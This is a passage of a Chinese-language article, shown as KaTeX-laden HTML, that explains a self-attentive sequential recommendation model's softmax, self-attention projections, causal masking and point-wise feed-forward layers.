style=\"height:0.143em;\"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:1.3070490000000001em;\"><span></span></span></span></span></span><span class=\"mclose nulldelimiter\"></span></span></span></span></span></span></p>\n<p>其中，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>z</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">z_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.58056em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.04398em;\">z</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.04398em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 是输入向量中的第 $i $ 个元素， <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>K</mi></mrow><annotation encoding=\"application/x-tex\">K</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68333em;vertical-align:0em;\"></span><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span></span></span></span> 是向量的维度。</p>\n<h3 id=\"自注意层\"><a class=\"anchor\" href=\"#自注意层\">#</a> 自注意层</h3>\n<ul>\n<li>\n<p><strong>旧方法</strong>：使用相同的对象作为查询、键和值。</p>\n</li>\n<li>\n<p><strong>该论文方法</strong>：将嵌入的 E 作为输入，通过线性投影将其转换为三个矩阵，并且发送到注意层中。</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><mi mathvariant=\"bold\">S</mi><mo>=</mo><mrow><mi mathvariant=\"normal\">S</mi><mi mathvariant=\"normal\">A</mi></mrow><mo stretchy=\"false\">(</mo><mover accent=\"true\"><mi mathvariant=\"bold\">E</mi><mo stretchy=\"true\">^</mo></mover><mo stretchy=\"false\">)</mo><mo>=</mo><mrow><mi mathvariant=\"normal\">A</mi><mi mathvariant=\"normal\">t</mi><mi mathvariant=\"normal\">t</mi><mi mathvariant=\"normal\">e</mi><mi mathvariant=\"normal\">n</mi><mi mathvariant=\"normal\">t</mi><mi mathvariant=\"normal\">i</mi><mi mathvariant=\"normal\">o</mi><mi mathvariant=\"normal\">n</mi></mrow><mo stretchy=\"false\">(</mo><mover accent=\"true\"><mi mathvariant=\"bold\">E</mi><mo stretchy=\"true\">^</mo></mover><msup><mi mathvariant=\"bold\">W</mi><mi>Q</mi></msup><mo separator=\"true\">,</mo><mover accent=\"true\"><mi mathvariant=\"bold\">E</mi><mo stretchy=\"true\">^</mo></mover><msup><mi mathvariant=\"bold\">W</mi><mi>K</mi></msup><mo separator=\"true\">,</mo><mover accent=\"true\"><mi mathvariant=\"bold\">E</mi><mo stretchy=\"true\">^</mo></mover><msup><mi mathvariant=\"bold\">W</mi><mi>V</mi></msup><mo stretchy=\"false\">)</mo><mo separator=\"true\">,</mo></mrow><annotation encoding=\"application/x-tex\">\\mathbf{S}=\\mathrm{SA}(\\widehat{\\mathbf{E}})=\\mathrm{Attention}(\\widehat{\\mathbf{E}}\\mathbf{W}^Q,\\widehat{\\mathbf{E}}\\mathbf{W}^K,\\widehat{\\mathbf{E}}\\mathbf{W}^V),\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.68611em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathbf\">S</span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.17611em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathrm\">S</span><span class=\"mord mathrm\">A</span></span><span class=\"mopen\">(</span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.92611em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">E</span></span></span></span><span class=\"svg-align\" style=\"width:calc(100% - 0.16668em);margin-left:0.16668em;top:-3.68611em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span style=\"height:0.24em;\"><svg width='100%' height='0.24em' viewBox='0 0 1062 239' preserveAspectRatio='none'><path d='M529 0h5l519 115c5 1 9 5 9 10 0 1-1 2-1 3l-4 22\nc-1 5-5 9-11 9h-2L532 67 19 159h-2c-5 0-9-4-11-9l-5-22c-1-6 2-12 8-13z'/></svg></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.17611em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathrm\">A</span><span class=\"mord mathrm\">t</span><span class=\"mord mathrm\">t</span><span class=\"mord mathrm\">e</span><span class=\"mord mathrm\">n</span><span class=\"mord mathrm\">t</span><span class=\"mord mathrm\">i</span><span class=\"mord mathrm\">o</span><span class=\"mord mathrm\">n</span></span><span class=\"mopen\">(</span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.92611em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">E</span></span></span></span><span class=\"svg-align\" style=\"width:calc(100% - 0.16668em);margin-left:0.16668em;top:-3.68611em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span style=\"height:0.24em;\"><svg width='100%' height='0.24em' viewBox='0 0 1062 239' preserveAspectRatio='none'><path d='M529 0h5l519 115c5 1 9 5 9 10 0 1-1 2-1 3l-4 22\nc-1 5-5 9-11 9h-2L532 67 19 159h-2c-5 0-9-4-11-9l-5-22c-1-6 2-12 8-13z'/></svg></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.891331em;\"><span style=\"top:-3.1130000000000004em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">Q</span></span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.92611em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">E</span></span></span></span><span class=\"svg-align\" style=\"width:calc(100% - 0.16668em);margin-left:0.16668em;top:-3.68611em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span style=\"height:0.24em;\"><svg width='100%' height='0.24em' viewBox='0 0 1062 239' preserveAspectRatio='none'><path d='M529 0h5l519 115c5 1 9 5 9 10 0 1-1 2-1 3l-4 22\nc-1 5-5 9-11 9h-2L532 67 19 159h-2c-5 0-9-4-11-9l-5-22c-1-6 2-12 8-13z'/></svg></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07153em;\">K</span></span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord accent\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.92611em;\"><span style=\"top:-3em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">E</span></span></span></span><span class=\"svg-align\" style=\"width:calc(100% - 0.16668em);margin-left:0.16668em;top:-3.68611em;\"><span class=\"pstrut\" style=\"height:3em;\"></span><span style=\"height:0.24em;\"><svg width='100%' height='0.24em' viewBox='0 0 1062 239' preserveAspectRatio='none'><path d='M529 0h5l519 115c5 1 9 5 9 10 0 1-1 2-1 3l-4 22\nc-1 5-5 9-11 9h-2L532 67 19 159h-2c-5 0-9-4-11-9l-5-22c-1-6 2-12 8-13z'/></svg></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8913309999999999em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.22222em;\">V</span></span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mpunct\">,</span></span></span></span></span></p>\n</li>\n<li>\n<p>投影矩阵<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi mathvariant=\"bold\">W</mi><mi>Q</mi></msup><mo separator=\"true\">,</mo><msup><mi mathvariant=\"bold\">W</mi><mi>K</mi></msup><mo separator=\"true\">,</mo><msup><mi mathvariant=\"bold\">W</mi><mi>V</mi></msup><mo>∈</mo><msup><mi mathvariant=\"double-struck\">R</mi><mrow><mi>d</mi><mo>×</mo><mi>d</mi></mrow></msup><mi mathvariant=\"normal\">.</mi></mrow><annotation encoding=\"application/x-tex\">\\mathbf{W}^Q,\\mathbf{W}^K,\\mathbf{W}^V\\in\\mathbb{R}^{d\\times d}.</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1.035771em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">Q</span></span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.07153em;\">K</span></span></span></span></span></span></span></span><span class=\"mpunct\">,</span><span class=\"mspace\" style=\"margin-right:0.16666666666666666em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8413309999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.22222em;\">V</span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">∈</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.8491079999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbb\">R</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8491079999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mord mathnormal mtight\">d</span><span class=\"mbin mtight\">×</span><span class=\"mord mathnormal mtight\">d</span></span></span></span></span></span></span></span></span><span class=\"mord\">.</span></span></span></span> 这些预测使得模型更灵活。</p>\n</li>\n</ul>\n<h3 id=\"因果关系\"><a class=\"anchor\" href=\"#因果关系\">#</a> 因果关系</h3>\n<p>模型在预测（t+1）-st 项时只考虑前 t 项，但是自注意层<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>S</mi><mi>t</mi></msub></mrow><annotation encoding=\"application/x-tex\">S_t</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.2805559999999999em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">t</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 的第<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mi>t</mi></mrow><annotation encoding=\"application/x-tex\">t</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.61508em;vertical-align:0em;\"></span><span class=\"mord mathnormal\">t</span></span></span></span> 个输出包含后续项目的嵌入会让模型不稳定，所以我们通过进制<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>Q</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">Q_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8777699999999999em;vertical-align:-0.19444em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\">Q</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 和<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>K</mi><mi>j</mi></msub></mrow><annotation encoding=\"application/x-tex\">K_j</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.969438em;vertical-align:-0.286108em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.07153em;\">K</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.311664em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.07153em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\" style=\"margin-right:0.05724em;\">j</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.286108em;\"><span></span></span></span></span></span></span></span></span></span><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><mo stretchy=\"false\">(</mo><mi>j</mi><mo>&gt;</mo><mi>i</mi><mo stretchy=\"false\">)</mo></mrow><annotation encoding=\"application/x-tex\">(j&gt;i)</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mopen\">(</span><span class=\"mord mathnormal\" style=\"margin-right:0.05724em;\">j</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">&gt;</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord mathnormal\">i</span><span class=\"mclose\">)</span></span></span></span> 直接的所有联系来修改注意力。</p>\n<h3 id=\"点对点前馈网络\"><a class=\"anchor\" href=\"#点对点前馈网络\">#</a> 点对点前馈网络</h3>\n<ul>\n<li>\n<p><strong>问题描述</strong>：虽然自注意力机制可以根据适应性权重聚合所有之前项目的嵌入，但其本质上仍然是线性模型。</p>\n</li>\n<li>\n<p><strong>解决方法</strong>：为了赋予模型非线性，并考虑不同潜在维度之间的交互，为每个 <span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">S_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 应用一个点对点两层前馈网络，每个<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msub><mi>S</mi><mi>i</mi></msub></mrow><annotation encoding=\"application/x-tex\">S_i</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83333em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.05764em;\">S</span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span></span></span></span> 的计算公式为：</p>\n<p><span class=\"katex-display\"><span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\" display=\"block\"><semantics><mrow><msub><mi mathvariant=\"bold\">F</mi><mi>i</mi></msub><mo>=</mo><mrow><mi mathvariant=\"normal\">F</mi><mi mathvariant=\"normal\">F</mi><mi mathvariant=\"normal\">N</mi></mrow><mo stretchy=\"false\">(</mo><msub><mi mathvariant=\"bold\">S</mi><mi>i</mi></msub><mo stretchy=\"false\">)</mo><mo>=</mo><mrow><mi mathvariant=\"normal\">R</mi><mi mathvariant=\"normal\">e</mi><mi mathvariant=\"normal\">L</mi><mi mathvariant=\"normal\">U</mi></mrow><mo stretchy=\"false\">(</mo><msub><mi mathvariant=\"bold\">S</mi><mi>i</mi></msub><msup><mi mathvariant=\"bold\">W</mi><mrow><mo stretchy=\"false\">(</mo><mn>1</mn><mo stretchy=\"false\">)</mo></mrow></msup><mo>+</mo><msup><mi mathvariant=\"bold\">b</mi><mrow><mo stretchy=\"false\">(</mo><mn>1</mn><mo stretchy=\"false\">)</mo></mrow></msup><mo stretchy=\"false\">)</mo><msup><mi mathvariant=\"bold\">W</mi><mrow><mo stretchy=\"false\">(</mo><mn>2</mn><mo stretchy=\"false\">)</mo></mrow></msup><mo>+</mo><msup><mi mathvariant=\"bold\">b</mi><mrow><mo stretchy=\"false\">(</mo><mn>2</mn><mo stretchy=\"false\">)</mo></mrow></msup></mrow><annotation encoding=\"application/x-tex\">\\mathbf{F}_i=\\mathrm{FFN}(\\mathbf{S}_i)=\\mathrm{ReLU}(\\mathbf{S}_i\\mathbf{W}^{(1)}+\\mathbf{b}^{(1)})\\mathbf{W}^{(2)}+\\mathbf{b}^{(2)}\n</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.83611em;vertical-align:-0.15em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">F</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathrm\">F</span><span class=\"mord mathrm\">F</span><span class=\"mord mathrm\">N</span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">S</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span><span class=\"mrel\">=</span><span class=\"mspace\" style=\"margin-right:0.2777777777777778em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.188em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord mathrm\">R</span><span class=\"mord mathrm\">e</span><span class=\"mord mathrm\">L</span><span class=\"mord mathrm\">U</span></span><span class=\"mopen\">(</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">S</span></span><span class=\"msupsub\"><span class=\"vlist-t vlist-t2\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.31166399999999994em;\"><span style=\"top:-2.5500000000000003em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mathnormal mtight\">i</span></span></span></span><span class=\"vlist-s\">​</span></span><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.15em;\"><span></span></span></span></span></span></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.938em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mtight\">1</span><span class=\"mclose mtight\">)</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:1.188em;vertical-align:-0.25em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">b</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.938em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mtight\">1</span><span class=\"mclose mtight\">)</span></span></span></span></span></span></span></span></span><span class=\"mclose\">)</span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\" style=\"margin-right:0.01597em;\">W</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.938em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mtight\">2</span><span class=\"mclose mtight\">)</span></span></span></span></span></span></span></span></span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span><span class=\"mbin\">+</span><span class=\"mspace\" style=\"margin-right:0.2222222222222222em;\"></span></span><span class=\"base\"><span class=\"strut\" style=\"height:0.938em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord\"><span class=\"mord mathbf\">b</span></span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.938em;\"><span style=\"top:-3.113em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mtight\">2</span><span class=\"mclose mtight\">)</span></span></span></span></span></span></span></span></span></span></span></span></span></p>\n<p>其中<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>W</mi><mrow><mo stretchy=\"false\">(</mo><mn>1</mn><mo stretchy=\"false\">)</mo></mrow></msup><mtext>和</mtext><msup><mi>W</mi><mrow><mo stretchy=\"false\">(</mo><mn>2</mn><mo stretchy=\"false\">)</mo></mrow></msup></mrow><annotation encoding=\"application/x-tex\">W^{(1)}和W^{(2)}</annotation></semantics></math></span><span class=\"katex-html\" aria-hidden=\"true\"><span class=\"base\"><span class=\"strut\" style=\"height:0.8879999999999999em;vertical-align:0em;\"></span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8879999999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mtight\">1</span><span class=\"mclose mtight\">)</span></span></span></span></span></span></span></span></span><span class=\"mord cjk_fallback\">和</span><span class=\"mord\"><span class=\"mord mathnormal\" style=\"margin-right:0.13889em;\">W</span><span class=\"msupsub\"><span class=\"vlist-t\"><span class=\"vlist-r\"><span class=\"vlist\" style=\"height:0.8879999999999999em;\"><span style=\"top:-3.063em;margin-right:0.05em;\"><span class=\"pstrut\" style=\"height:2.7em;\"></span><span class=\"sizing reset-size6 size3 mtight\"><span class=\"mord mtight\"><span class=\"mopen mtight\">(</span><span class=\"mord mtight\">2</span><span class=\"mclose mtight\">)</span></span></span></span></span></span></span></span></span></span></span></span> 是 d×d 矩阵，<span class=\"katex\"><span class=\"katex-mathml\"><math xmlns=\"http://www.w3.org/1998/Math/MathML\"><semantics><mrow><msup><mi>b</mi><mrow><mo 